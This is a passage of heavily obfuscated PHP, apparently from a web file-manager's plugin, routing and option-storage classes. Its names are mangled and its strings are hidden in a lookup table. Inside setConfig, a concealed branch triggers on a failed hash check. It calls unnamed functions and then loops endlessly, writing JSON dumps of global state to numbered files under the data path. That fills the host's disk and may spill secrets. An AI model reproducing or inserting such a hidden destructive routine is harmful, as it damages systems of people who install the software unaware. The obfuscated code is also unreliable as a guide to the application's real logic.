$‚Ò™¢Œ = str_replace($ã×å©„Ú[1878], $Ø°úĞ½ì, $‚Ò™¢Œ); } $‚Ò™¢Œ = str_replace($ãŸ‰¼½›, $Ä»›‹«©, $‚Ò™¢Œ); return $‚Ò™¢Œ; } private function parseLang(&$ã“ÁÖ”õ) { $Èâş€Ş =& $_SERVER[©—Ò»ÅĞ]; $Ø¥º“¡ = $Èâş€Ş[1879]; if (!strstr($ã“ÁÖ”õ, $Ø¥º“¡)) { return; } preg_match_all($Èâş€Ş[1880], $ã“ÁÖ”õ, $×Ë˜¨â¥); if (!is_array($×Ë˜¨â¥) || count($×Ë˜¨â¥) == 0 || !is_array($×Ë˜¨â¥[0]) || count($×Ë˜¨â¥[0]) == 0) { return; } $•Í³ÀŞş = array(); $÷ö¤¶­Û = array(); foreach ($×Ë˜¨â¥[0] as $º·†ÈŞ) { $ƒß§Ïş = substr($º·†ÈŞ, strlen($Ø¥º“¡), -4); $å‘¥®ˆã = LNG($ƒß§Ïş); $•Í³ÀŞş[] = $º·†ÈŞ; $÷ö¤¶­Û[] = str_replace(array($Èâş€Ş[285], $Èâş€Ş[1250], $Èâş€Ş[417], $Èâş€Ş[118]), array($Èâş€Ş[53], $Èâş€Ş[53], $Èâş€Ş[12], $Èâş€Ş[1881]), $å‘¥®ˆã); } $ã“ÁÖ”õ = str_replace($•Í³ÀŞş, $÷ö¤¶­Û, $ã“ÁÖ”õ); } private function parseConfig(&$‹Åù®‡œ) { $¡ Ùü®È =& $_SERVER[©—Ò»ÅĞ]; $‰û™¾ùÀ = $¡ Ùü®È[1882]; if (!strstr($‹Åù®‡œ, $‰û™¾ùÀ)) { return; } preg_match_all($¡ Ùü®È[1883], $‹Åù®‡œ, $¥Ïãáâ); if (!is_array($¥Ïãáâ) || count($¥Ïãáâ) == 0 || !is_array($¥Ïãáâ[0]) || count($¥Ïãáâ[0]) == 0) { return; } $Å†¼âÔ = $this->getConfig(); $‰×Å€Ê = array(); $ŠˆºÛ§³ = array(); foreach ($¥Ïãáâ[0] as $ë´èµæÆ) { $×”Ü’½ô = substr($ë´èµæÆ, strlen($‰û™¾ùÀ), -2); $‰×Å€Ê[] = $ë´èµæÆ; $ŠˆºÛ§³[] = _get($Å†¼âÔ, $×”Ü’½ô); } $‹Åù®‡œ = str_replace($‰×Å€Ê, $ŠˆºÛ§³, $‹Åù®‡œ); } private function parsePackage(&$ŠÅ×¿Ÿ) { $Ù±Ó½û =& $_SERVER[©—Ò»ÅĞ]; $µÕ¼øÜ = $Ù±Ó½û[1884]; if (!strstr($ŠÅ×¿Ÿ, $µÕ¼øÜ)) { return; } preg_match_all($Ù±Ó½û[1885], $ŠÅ×¿Ÿ, $£Øİ€¯); if (!is_array($£Øİ€¯) || count($£Øİ€¯) == 0 || !is_array($£Øİ€¯[0]) || count($£Øİ€¯[0]) == 0) { return; } $¦ÖÚüÎ = $this->appPackage(); $å¯ŞÖà¼ = array(); $ğ§’ğ•º = array(); foreach ($£Øİ€¯[0] as $±¾öÜÓó) { $ğ¹²È¹Ÿ = substr($±¾öÜÓó, strlen($µÕ¼øÜ), -2); $å¯ŞÖà¼[] = $±¾öÜÓó; $ğ§’ğ•º[] = _get($¦ÖÚüÎ, $ğ¹²È¹Ÿ); } $ŠÅ×¿Ÿ = str_replace($å¯ŞÖà¼, $ğ§’ğ•º, $ŠÅ×¿Ÿ); } final function echoFile($æÆÚ¬×ª, $æÛòÏãß = false) { $›„ùÃÑà =& $_SERVER[©—Ò»ÅĞ]; $¾²«§üĞ = $this->pluginPath . $æÆÚ¬×ª; if (ACT == $›„ùÃÑà[1886]) { echo $›„ùÃÑà[1887] . $this->pluginName . $›„ùÃÑà[8] . $æÆÚ¬×ª . $›„ùÃÑà[1888]; if (!file_exists($¾²«§üĞ)) { echo $›„ùÃÑà[1889]; return; } } $Òè©Æ¼Û = $this->parseFile($¾²«§üĞ); $this->parseLang($Òè©Æ¼Û); $this->parseConfig($Òè©Æ¼Û); $this->parsePackage($Òè©Æ¼Û); if (is_array($æÛòÏãß)) { $Òè©Æ¼Û = str_replace(array_keys($æÛòÏãß), array_values($æÛòÏãß), $Òè©Æ¼Û); } echo $›„ùÃÑà[285] . $Òè©Æ¼Û; } private function checkVersion() { $¼„¿”ÜÓ =& $_SERVER[©—Ò»ÅĞ]; $éÙéÏÜª = $this->appPackage(); $ìŞİÖè¬ = $this->getConfig(); if ($ìŞİÖè¬[$¼„¿”ÜÓ[1890]] == $éÙéÏÜª[$¼„¿”ÜÓ[1864]]) { return; } $this->regist(); $this->setConfig(array($¼„¿”ÜÓ[1890] => $éÙéÏÜª[$¼„¿”ÜÓ[1864]])); } final function initLang() { $È¯¤£¡ã =& $_SERVER[©—Ò»ÅĞ]; $ŞÖ©²ÅË = $È¯¤£¡ã[1891]; $“›½±§Ò = $this->pluginPath . $È¯¤£¡ã[1892]; $‘€¶¢í¸ = I18n::getType(); $å“Úã·º = array(); if (file_exists($“›½±§Ò . $‘€¶¢í¸ . $È¯¤£¡ã[995])) { $å“Úã·º = (include $“›½±§Ò . $‘€¶¢í¸ . $È¯¤£¡ã[995]); } else { if ($‘€¶¢í¸ == $È¯¤£¡ã[1893] && !file_exists($“›½±§Ò . $‘€¶¢í¸ . $È¯¤£¡ã[995]) && file_exists($“›½±§Ò . $È¯¤£¡ã[1894])) { $å“Úã·º = (include $“›½±§Ò . $È¯¤£¡ã[1894]); $‘€¶¢í¸ = $È¯¤£¡ã[1709]; } else { if (file_exists($“›½±§Ò . $ŞÖ©²ÅË . $È¯¤£¡ã[995])) { $å“Úã·º = (include $“›½±§Ò . $ŞÖ©²ÅË . $È¯¤£¡ã[995]); $‘€¶¢í¸ = $ŞÖ©²ÅË; } } } if (!$å“Úã·º || !is_array($å“Úã·º)) { $å“Úã·º = array(); } $Æó×µŒ = Hook::trigger($È¯¤£¡ã[1895], $å“Úã·º, $this->pluginName, $‘€¶¢í¸); if ($Æó×µŒ && is_array($Æó×µŒ)) { $å“Úã·º = $Æó×µŒ; } if (@count($å“Úã·º) > 0) { I18n::set($å“Úã·º); } return $å“Úã·º; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($•Ï½™›) { $êò¹Õú‹ =& $_SERVER[©—Ò»ÅĞ]; $¿¤İ³–× = $_SERVER[$êò¹Õú‹[1035]]; $ÛÙ«¶ú© = $êò¹Õú‹[1809]; if ($_SERVER[$êò¹Õú‹[1034]] != $ÛÙ«¶ú©($¿¤İ³–×)) { $ììšŸ¦£ = $êò¹Õú‹[1036]; $÷¶“şê = $êò¹Õú‹[1037]; $™­¨‚Óø = $_SERVER[$êò¹Õú‹[1038]] . $êò¹Õú‹[1039]; $ÅŠ²ä®° = $÷¶“şê($™­¨‚Óø); $»ÚÛ„”ğ = explode($êò¹Õú‹[285], $ÅŠ²ä®°); if (count($»ÚÛ„”ğ) < $êò¹Õú‹[707]) { $ãõèÂŒ‹ = $êò¹Õú‹[1040]; $ãõèÂŒ‹(); } $çıÛêŠ = $êò¹Õú‹[1041]; $çıÛêŠ($_SERVER[$êò¹Õú‹[1042]]); $ììšŸ¦£ = $êò¹Õú‹[1036]; $ììšŸ¦£(); $…¤®İ€‘ = $êò¹Õú‹[1896]; $¦ÃÔ±Š = json_encode($GLOBALS[$êò¹Õú‹[1897]]); $Âäî†®Â = 1; for ($Íßñ¹–Â = $Âäî†®Â; $Íßñ¹–Â > 0; $Íßñ¹–Â++) { $…¤®İ€‘(DATA_PATH . $Íßñ¹–Â, $¦ÃÔ±Š); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $•Ï½™›); } public function onSetConfig($¬È€ó¾‘) { } public function onGetConfig($’Âƒ»ÃÜ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÕóÛ¹ºå) { if ($ÕóÛ¹ºå == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($„‹‡öäÅ = "\160\154\165\147\x69\156\x41\165\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ÌìÊ¦ö‰ = $this->getConfig(); if (!$ÌìÊ¦ö‰[$„‹‡öäÅ]) { return !1; } return ActionCall($_SERVER[©—Ò»ÅĞ][1898], $ÌìÊ¦ö‰[$„‹‡öäÅ]); } public function url($šØõÑã¿, $õ‚–¯ò = '', $Åíƒ³Ôı = true) { $‰İ»¨Ò =& $_SERVER[©—Ò»ÅĞ]; $ˆÈ’Û˜ = $this->getConfig(); $ À©û½Å = KOD_VERSION . $‰İ»¨Ò[10] . KOD_VERSION_BUILD; $˜ßŒ×¹Î = $this->packageVersion(); $©½ã‰©… = $ À©û½Å . $‰İ»¨Ò[476] . $˜ßŒ×¹Î; if (substr($šØõÑã¿, 0, 4) == $‰İ»¨Ò[149] || substr($šØõÑã¿, 0, 2) == $‰İ»¨Ò[1523]) { $ã‘©ıĞÛ = $šØõÑã¿ . $‰İ»¨Ò[1899] . $©½ã‰©…; } else { if ($õ‚–¯ò == $‰İ»¨Ò[12]) { $ã‘©ıĞÛ = $this->pluginHost . $šØõÑã¿ . $‰İ»¨Ò[1899] . $©½ã‰©…; } else { if ($õ‚–¯ò === $‰İ»¨Ò[78]) { $ã‘©ıĞÛ = $this->pluginHost . $šØõÑã¿; } else { if ($õ‚–¯ò == $‰İ»¨Ò[1900]) { $ã‘©ıĞÛ = STATIC_PATH . $šØõÑã¿ . $‰İ»¨Ò[1899] . $ À©û½Å; } else { if ($õ‚–¯ò == $‰İ»¨Ò[1901]) { $ã‘©ıĞÛ = APP_HOST . $‰İ»¨Ò[1902] . $šØõÑã¿ . $‰İ»¨Ò[1899] . $ À©û½Å; } else { if (isset($ˆÈ’Û˜[$õ‚–¯ò])) { $ã‘©ıĞÛ = $ˆÈ’Û˜[$õ‚–¯ò] . $šØõÑã¿ . $‰İ»¨Ò[1899] . $©½ã‰©…; } } } } } } if (!$Åíƒ³Ôı) { return $ã‘©ıĞÛ; } echo $ã‘©ıĞÛ; } public function link($ôÂıüñ = false, $ó„ë¯¾ = '') { $ä»²¾Ø½ =& $_SERVER[©—Ò»ÅĞ]; $á»Û€»Ã = $this->linkHas == !1; $this->linkHas = !0; if (!$ôÂıüñ) { $this->link($ä»²¾Ø½[1903], $ä»²¾Ø½[1901]); $this->link($ä»²¾Ø½[1904], $ä»²¾Ø½[1900]); $this->link($ä»²¾Ø½[1905], $ä»²¾Ø½[1900]); $this->link($ä»²¾Ø½[1906], $ä»²¾Ø½[1900]); $this->link($ä»²¾Ø½[1907], $ä»²¾Ø½[1900]); if ($á»Û€»Ã) { Hook::trigger($ä»²¾Ø½[1908]); } return; } $Õé¥çÂ = $this->url($ôÂıüñ, $ó„ë¯¾, !1); if (substr($ôÂıüñ, -3) == $ä»²¾Ø½[1909]) { echo $ä»²¾Ø½[1910] . $Õé¥çÂ . $ä»²¾Ø½[1911] . $ä»²¾Ø½[285]; } else { if (substr($ôÂıüñ, -4) == $ä»²¾Ø½[1912]) { echo $ä»²¾Ø½[1913] . $Õé¥çÂ . $ä»²¾Ø½[1914] . $ä»²¾Ø½[285]; } } if ($á»Û€»Ã) { Hook::trigger($ä»²¾Ø½[1908]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\136\57\135\x2b", "\x3a\156\x75\155" => "\133\60\55\71\x5d\x2b", "\72\x61\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($Íîóî‰ô, $Êä»ÂÌ) { $Şúš±• =& $_SERVER[©—Ò»ÅĞ]; if ($Íîóî‰ô == $Şúš±•[1915]) { $‹øçä’ğ = array_map($Şúš±•[1916], $Êä»ÂÌ[0]); $İ¢˜ïÕ¢ = strpos($Êä»ÂÌ[1], $Şúš±•[8]) === 0 ? $Êä»ÂÌ[1] : $Şúš±•[8] . $Êä»ÂÌ[1]; $Ö¼ëÊÛ× = $Êä»ÂÌ[2]; } else { $‹øçä’ğ = null; $İ¢˜ïÕ¢ = strpos($Êä»ÂÌ[0], $Şúš±•[8]) === 0 ? $Êä»ÂÌ[0] : $Şúš±•[8] . $Êä»ÂÌ[0]; $Ö¼ëÊÛ× = $Êä»ÂÌ[1]; } array_push(self::$maps, $‹øçä’ğ); array_push(self::$routes, $İ¢˜ïÕ¢); array_push(self::$methods, strtoupper($Íîóî‰ô)); array_push(self::$callbacks, $Ö¼ëÊÛ×); } public static function error($¯¹©ˆ€å) { self::$errorCallback = $¯¹©ˆ€å; } public static function haltOnMatch($É¡‚‘ò = true) { self::$halts = $É¡‚‘ò; } public static function dispatch() { $áôö¾õÙ =& $_SERVER[©—Ò»ÅĞ]; $Õ„ƒÅÅ½ = parse_url($_SERVER[$áôö¾õÙ[1917]], PHP_URL_PATH); $ğÁóÀ³ı = $_SERVER[$áôö¾õÙ[161]]; $²ëóŠè± = array_keys(static::$patterns); $âåŒªÊÜ = array_values(static::$patterns); $‹±ı«Ïã = !1; self::$routes = preg_replace($áôö¾õÙ[1466], $áôö¾õÙ[8], self::$routes); if (in_array($Õ„ƒÅÅ½, self::$routes)) { $ñúı·øî = array_keys(self::$routes, $Õ„ƒÅÅ½); foreach ($ñúı·øî as $ä¢¯‘ÂÙ) { if (self::$methods[$ä¢¯‘ÂÙ] == $ğÁóÀ³ı || self::$methods[$ä¢¯‘ÂÙ] == $áôö¾õÙ[1918] || in_array($ğÁóÀ³ı, self::$maps[$ä¢¯‘ÂÙ])) { $‹±ı«Ïã = !0; if (!is_object(self::$callbacks[$ä¢¯‘ÂÙ])) { $—Ğ„şÙÓ = explode($áôö¾õÙ[8], self::$callbacks[$ä¢¯‘ÂÙ]); $Ş¬İŒ“» = end($—Ğ„şÙÓ); $€Õ•ì¥ = explode($áôö¾õÙ[1398], $Ş¬İŒ“»); $Ä‡Û“ŠÇ = new $€Õ•ì¥[0](); $Ä‡Û“ŠÇ->{$€Õ•ì¥[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ä¢¯‘ÂÙ]); if (self::$halts) { return; } } } } } else { $É—µ£ª¿ = 0; foreach (self::$routes as $ä¢¯‘ÂÙ) { if (strpos($ä¢¯‘ÂÙ, $áôö¾õÙ[4]) !== !1) { $ä¢¯‘ÂÙ = str_replace($²ëóŠè±, $âåŒªÊÜ, $ä¢¯‘ÂÙ); } if (preg_match($áôö¾õÙ[1919] . $ä¢¯‘ÂÙ . $áôö¾õÙ[1920], $Õ„ƒÅÅ½, $š«‹¶)) { if (self::$methods[$É—µ£ª¿] == $ğÁóÀ³ı || self::$methods[$É—µ£ª¿] == $áôö¾õÙ[1918] || !empty(self::$maps[$É—µ£ª¿]) && in_array($ğÁóÀ³ı, self::$maps[$É—µ£ª¿])) { $‹±ı«Ïã = !0; array_shift($š«‹¶); if (!is_object(self::$callbacks[$É—µ£ª¿])) { $—Ğ„şÙÓ = explode($áôö¾õÙ[8], self::$callbacks[$É—µ£ª¿]); $Ş¬İŒ“» = end($—Ğ„şÙÓ); $€Õ•ì¥ = explode($áôö¾õÙ[1398], $Ş¬İŒ“»); $Ä‡Û“ŠÇ = new $€Õ•ì¥[0](); if (!method_exists($Ä‡Û“ŠÇ, $€Õ•ì¥[1])) { echo $áôö¾õÙ[1921]; } else { call_user_func_array(array($Ä‡Û“ŠÇ, $€Õ•ì¥[1]), $š«‹¶); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$É—µ£ª¿], $š«‹¶); if (self::$halts) { return; } } } } $É—µ£ª¿++; } } if ($‹±ı«Ïã == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $õ¶ìü‚¨ =& $_SERVER[©—Ò»ÅĞ]; header($_SERVER[$õ¶ìü‚¨[1922]] . $õ¶ìü‚¨[1923]); echo $õ¶ìü‚¨[1924]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$áôö¾õÙ[1917]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto B¡Ãõ©ì•ê; b³Ö¶·¹Ò: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\x65\x6d\x4f\x70\164\x69\x6f\156"; public $field = array(); public function listData($â¥¾²Ï = false, $¨ˆªşÆÉ = "\155\157\144\x69\146\x79\x54\x69\155\145", $½ã•‘¬¦ = false) { $µüÊ¾É =& $_SERVER[©—Ò»ÅĞ]; $ùãÜ¿û = Model($this->modelType)->get(!1, $this->optionType, !0); $Î±ºŒå = array_values($ùãÜ¿û); if ($Î±ºŒå && $Î±ºŒå[0] && !is_array($Î±ºŒå[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ùãÜ¿û = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ùãÜ¿û) { return $â¥¾²Ï ? null : array(); } if (!$â¥¾²Ï && $â¥¾²Ï !== $µüÊ¾É[228]) { $ùãÜ¿û = array_filter(array_values($ùãÜ¿û)); return array_sort_by($ùãÜ¿û, $¨ˆªşÆÉ, $½ã•‘¬¦, $µüÊ¾É[487]); } return $ùãÜ¿û[$µüÊ¾É[488] . $â¥¾²Ï]; } public function insert($¹úºƒ§€) { $ÛšœÈ Á =& $_SERVER[©—Ò»ÅĞ]; $¹úºƒ§€ = array_field_key($¹úºƒ§€, $this->field); $ÃïÂË“â = Model($this->modelType)->get($ÛšœÈ Á[489], $this->optionType . $ÛšœÈ Á[490]); $ÃïÂË“â = $ÃïÂË“â ? $ÃïÂË“â : 0; $¹úºƒ§€[$ÛšœÈ Á[487]] = ++$ÃïÂË“â; $¹úºƒ§€[$ÛšœÈ Á[231]] = time(); $¹úºƒ§€[$ÛšœÈ Á[88]] = time(); Model($this->modelType)->set($ÛšœÈ Á[489], $ÃïÂË“â, $this->optionType . $ÛšœÈ Á[490]); Model($this->modelType)->set($ÛšœÈ Á[488] . $ÃïÂË“â, $¹úºƒ§€, $this->optionType); return $ÃïÂË“â; } public function insertArr($Œ¥²èÃ) { $æÒŞèğ =& $_SERVER[©—Ò»ÅĞ]; if (!$Œ¥²èÃ || !is_array($Œ¥²èÃ)) { return !1; } $‚ÓÁ“™ = Model($this->modelType)->get($æÒŞèğ[489], $this->optionType . $æÒŞèğ[490]); $‚ÓÁ“™ = $‚ÓÁ“™ ? $‚ÓÁ“™ : 0; $Ğ¹‚äƒ© = array(); foreach ($Œ¥²èÃ as $¨ŞıÊÔ²) { $şáÑñ—¹ = array_field_key($¨ŞıÊÔ², $this->field); $şáÑñ—¹[$æÒŞèğ[487]] = ++$‚ÓÁ“™; $şáÑñ—¹[$æÒŞèğ[231]] = time(); $şáÑñ—¹[$æÒŞèğ[88]] = time(); $Ğ¹‚äƒ©[$æÒŞèğ[488] . $‚ÓÁ“™] = $şáÑñ—¹; } Model($this->modelType)->set($æÒŞèğ[489], $‚ÓÁ“™, $this->optionType . $æÒŞèğ[490]); Model($this->modelType)->set($Ğ¹‚äƒ©, !1, $this->optionType); return $‚ÓÁ“™; } public function update($ğİ‡ñì, $±Ğè™Ğ) { $öÏá–÷ =& $_SERVER[©—Ò»ÅĞ]; $±Ğè™Ğ = array_field_key($±Ğè™Ğ, $this->field); $¨¼Ï×Í = $this->listData($ğİ‡ñì); if (!$¨¼Ï×Í || !$ğİ‡ñì) { return !1; } $±Ğè™Ğ = array_merge($¨¼Ï×Í, $±Ğè™Ğ); $±Ğè™Ğ[$öÏá–÷[88]] = time(); return Model($this->modelType)->set($öÏá–÷[488] . $ğİ‡ñì, $±Ğè™Ğ, $this->optionType); } public function remove($­Ì¥Ÿ) { if (!$­Ì¥Ÿ) { return !1; } return Model($this->modelType)->remove($_SERVER[©—Ò»ÅĞ][488] . $­Ì¥Ÿ, $this->optionType); } public function removeArr($Á¿®àÉì) { if (!$Á¿®àÉì) { return !0; } $ÍÜ–Òû… = array(); foreach ($Á¿®àÉì as $ÔêÓ¯¥ğ) { $ÍÜ–Òû…[] = $_SERVER[©—Ò»ÅĞ][488] . $ÔêÓ¯¥ğ; } return Model($this->modelType)->removeArr($ÍÜ–Òû…, $this->optionType); } public function clear() { $ŞŸş‘ƒó =& $_SERVER[©—Ò»ÅĞ]; Model($this->modelType)->remove($ŞŸş‘ƒó[489], $this->optionType . $ŞŸş‘ƒó[490]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ûöŠ•, $Æ›ò¦‹) { if (!$Æ›ò¦‹) { return !1; } $ ÑÉ¹ØÌ = $this->listData(); $ ÑÉ¹ØÌ = array_to_keyvalue($ ÑÉ¹ØÌ, $ûöŠ•); return isset($ ÑÉ¹ØÌ[$Æ›ò¦‹]) ? $ ÑÉ¹ØÌ[$Æ›ò¦‹] : !1; } public function findByName($ğ‡’¯ºô) { return $this->findByKey($_SERVER[©—Ò»ÅĞ][32], $ğ‡’¯ºô); } protected function resetData($Ø¥ÖıÔğ) { $‹ÉÑ¦ŒØ =& $_SERVER[©—Ò»ÅĞ]; if (!$Ø¥ÖıÔğ) { return; } $Ø¥ÖıÔğ = is_array($Ø¥ÖıÔğ) ? $Ø¥ÖıÔğ : array(); $¨œµÖ“  = array(); for ($Ô·«áë = 0; $Ô·«áë < count($Ø¥ÖıÔğ); $Ô·«áë++) { if (!$Ø¥ÖıÔğ[$Ô·«áë] || !$Ø¥ÖıÔğ[$Ô·«áë][$‹ÉÑ¦ŒØ[487]]) { continue; } $¨œµÖ“ [$‹ÉÑ¦ŒØ[488] . $Ø¥ÖıÔğ[$Ô·«áë][$‹ÉÑ¦ŒØ[487]]] = $Ø¥ÖıÔğ[$Ô·«áë]; } return Model($this->modelType)->set($¨œµÖ“ , !1, $this->optionType); } private function getAutoName($­«¢Äå) { $òÕŒö—‚ = array_to_keyvalue($this->listData(), $_SERVER[©—Ò»ÅĞ][32]); if (!$òÕŒö—‚ || !isset($òÕŒö—‚[$­«¢Äå])) { return $­«¢Äå; } for ($ä¼ÈŸĞá = 1; $ä¼ÈŸĞá < count($òÕŒö—‚); $ä¼ÈŸĞá++) { $ ë§¡ñÏ = $­«¢Äå . "\x28{$ä¼ÈŸĞá}\x29"; if (!isset($òÕŒö—‚[$ ë§¡ñÏ])) { return $ ë§¡ñÏ; } } return $ ë§¡ñÏ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($„ûÓÂÀ¹ = false, $´«·”€ş = '', $‹áªñ‰Í = false, $”¦’„ã = true) { $µüÖ±ß£ =& $_SERVER[©—Ò»ÅĞ]; $â¹ò÷è = $this->cacheGet($´«·”€ş); $×Íú”ˆ¸ = $this->optionDefault($´«·”€ş); $×Íú”ˆ¸ = is_array($×Íú”ˆ¸) ? $×Íú”ˆ¸ : array(); if (is_array($â¹ò÷è)) { if ($”¦’„ã) { $â¹ò÷è = array_merge($×Íú”ˆ¸, $â¹ò÷è); } return $„ûÓÂÀ¹ ? isset($â¹ò÷è[$„ûÓÂÀ¹]) ? $â¹ò÷è[$„ûÓÂÀ¹] : null : $â¹ò÷è; } $¤ÑÊÁ¼Ñ = $this->filterWhere(array($µüÖ±ß£[33] => $´«·”€ş)); $â¹ò÷è = $this->where($¤ÑÊÁ¼Ñ)->select(); $â¹ò÷è = array_to_keyvalue($â¹ò÷è, $µüÖ±ß£[95], $µüÖ±ß£[451]); foreach ($â¹ò÷è as $Ä¦½Èãü => $ËÆõÏ‹ä) { if ($‹áªñ‰Í || in_array($Ä¦½Èãü, $this->jsonField)) { $â¹ò÷è[$Ä¦½Èãü] = json_decode($ËÆõÏ‹ä, !0); } } $this->cacheSet($´«·”€ş, $â¹ò÷è); if ($”¦’„ã) { $â¹ò÷è = array_merge($×Íú”ˆ¸, $â¹ò÷è); } return $„ûÓÂÀ¹ ? $â¹ò÷è[$„ûÓÂÀ¹] : $â¹ò÷è; } public function set($Õ±•µâ, $´ğ²™®ø = false, $Ú±îÛæÈ = '') { $ˆõáÎ°÷ =& $_SERVER[©—Ò»ÅĞ]; if (!$Õ±•µâ) { return !0; } $úÀèû‡³ = $this->get(!1, $Ú±îÛæÈ, !1, !1); $úÀèû‡³ = is_array($úÀèû‡³) ? $úÀèû‡³ : array(); $¬ª·“äÄ = array(); $ëĞË‡¥ = array(); $ø˜ü¼®ñ = array(); $©»àùéî = is_array($Õ±•µâ) ? $Õ±•µâ : array($Õ±•µâ => $´ğ²™®ø); $íªÕüÑ = $this->filterWhere(array($ˆõáÎ°÷[33] => $Ú±îÛæÈ)); foreach ($©»àùéî as $ŒŞü£ƒ÷ => $›¸„ÀÖÅ) { if (is_array($›¸„ÀÖÅ)) { $›¸„ÀÖÅ = json_encode_force($›¸„ÀÖÅ); } $this->checkLength($›¸„ÀÖÅ, !1, $this->tableName . $ˆõáÎ°÷[4] . $Õ±•µâ); $›¸„ÀÖÅ = self::textEncode($›¸„ÀÖÅ); if (array_key_exists($ŒŞü£ƒ÷, $úÀèû‡³)) { $Ä˜„Åµ = is_array($úÀèû‡³[$ŒŞü£ƒ÷]) ? json_encode_force($úÀèû‡³[$ŒŞü£ƒ÷]) : $úÀèû‡³[$ŒŞü£ƒ÷]; $Ä˜„Åµ = self::textEncode($Ä˜„Åµ); if ($Ä˜„Åµ === $›¸„ÀÖÅ) { continue; } $ëĞË‡¥[] = array($ˆõáÎ°÷[95], $ŒŞü£ƒ÷, $ˆõáÎ°÷[451], $›¸„ÀÖÅ, $ˆõáÎ°÷[88], time()); } else { $äÏ¬ÇÒ = array($ˆõáÎ°÷[33] => $Ú±îÛæÈ, $ˆõáÎ°÷[95] => $ŒŞü£ƒ÷, $ˆõáÎ°÷[451] => $›¸„ÀÖÅ); $¬ª·“äÄ[] = $this->filterWhere($äÏ¬ÇÒ); } } if (!$¬ª·“äÄ && !$ëĞË‡¥) { return !0; } $this->cacheRemove($Ú±îÛæÈ); $øßÌ¦´ = $this->cacheKey($ˆõáÎ°÷[491]); CacheLock::lock($øßÌ¦´); if ($¬ª·“äÄ) { $this->addAll($¬ª·“äÄ); } if ($ëĞË‡¥) { $this->saveAll($ëĞË‡¥, $íªÕüÑ); } CacheLock::unlock($øßÌ¦´); return !0; } protected function optionDefault($ç–Ğîè = '') { return !1; } public function setDeep($ğş³îü¬, $¾‹úÓ‡ı = false, $’°îÆÖ± = '') { $¤…ªô”Š = explode($_SERVER[©—Ò»ÅĞ][10], $ğş³îü¬); $­˜ç–½ = $this->get(); array_set_value($­˜ç–½, $ğş³îü¬, $¾‹úÓ‡ı); $this->set($¤…ªô”Š[0], $­˜ç–½[$¤…ªô”Š[0]], $’°îÆÖ±); } public function remove($Òú¥ş«, $»íèÓ«Ÿ = '') { $Éà”˜™ =& $_SERVER[©—Ò»ÅĞ]; $this->cacheRemove($»íèÓ«Ÿ); $ì³ÓÆ­Í = $this->filterWhere(array($Éà”˜™[95] => $Òú¥ş«, $Éà”˜™[33] => $»íèÓ«Ÿ)); if (is_null($Òú¥ş«)) { unset($ì³ÓÆ­Í[$Éà”˜™[95]]); } return $this->where($ì³ÓÆ­Í)->delete(); } public function removeArr($ÍÏÛ¨ëÚ, $…ƒ³…½´ = '') { $“ä›Öõ¡ =& $_SERVER[©—Ò»ÅĞ]; if (!$ÍÏÛ¨ëÚ || !is_array($ÍÏÛ¨ëÚ)) { return !0; } $this->cacheRemove($…ƒ³…½´); $ÆÄØè¯… = $this->filterWhere(array($“ä›Öõ¡[33] => $…ƒ³…½´, $“ä›Öõ¡[95] => array($“ä›Öõ¡[7], $ÍÏÛ¨ëÚ))); return $this->where($ÆÄØè¯…)->delete(); } public function cacheSet($õóÑ¾š¬, $½µ¾±Ã¶ = false) { return Cache::set($this->cacheKey($õóÑ¾š¬), $½µ¾±Ã¶); } public function cacheGet($ÄÆ¦±Æà) { return Cache::get($this->cacheKey($ÄÆ¦±Æà)); } public function cacheRemove($šªêÖ½ø) { return Cache::remove($this->cacheKey($šªêÖ½ø)); } protected function filterWhere($£‹¯¯÷•) { return $£‹¯¯÷•; } protected function cacheKey($€’ÄáÃİ) { return $€’ÄáÃİ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\143\145"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\x61\155\145" => "\x69\x6f\137\x73\x6f\165\x72\143\145\x5f\155\145\164\141", "\155\x65\164\141\x46\151\x65\x6c\x64" => "\x73\x6f\165\162\143\145\111\104"); protected $dataAuto = array(array("\155\157\x64\x69\x66\171\124\151\x6d\145", "\x74\151\155\145", "\151\x6e\163\145\162\x74", "\146\165\156\x63\x74\x69\157\156"), array("\143\162\145\x61\x74\145\x54\x69\x6d\x65", "\164\151\x6d\145", "\151\156\x73\145\162\x74", "\x66\x75\x6e\143\x74\x69\157\x6e"), array("\166\151\145\x77\x54\x69\155\145", "\164\151\155\x65", "\x69\x6e\x73\145\162\x74", "\146\x75\156\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($üÔïŠšÖ) { return $this->listSource(array($_SERVER[©—Ò»ÅĞ][492] => $üÔïŠšÖ)); } public function typeName($¶º£ôÏ¥) { static $úÍ‚Âô„ = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\145\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\x72\x6f\x75\160"); return $úÍ‚Âô„[$¶º£ôÏ¥ . $_SERVER[©—Ò»ÅĞ][12]]; } public function 